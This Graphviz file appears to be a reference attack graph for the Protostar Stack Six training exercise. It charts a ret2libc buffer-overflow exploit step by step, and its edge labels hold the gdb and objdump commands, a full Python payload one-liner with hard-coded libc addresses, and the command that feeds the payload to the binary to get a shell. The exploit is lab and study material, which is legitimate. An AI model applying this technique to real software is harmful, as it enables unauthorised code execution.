digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Stack Six"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Saved EIP offset identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="libc system() address recovered"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="libc exit() and /bin/sh address recovered"];
  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="ret2libc payload built"];
  node4 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Shell obtained via ret2libc"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q /opt/protostar/bin/stack6"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q /opt/protostar/bin/stack6"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -T /lib/libc.so.6 | grep ' exit$'"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'import struct; print \"A\"*80 + struct.pack(\"<I\", 0xb7ecffb0) + struct.pack(\"<I\", 0xb7ec60c0) + struct.pack(\"<I\", 0xb7fb63bf)' > /tmp/stack6.in"];
  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="/opt/protostar/bin/stack6 < /tmp/stack6.in"];
}
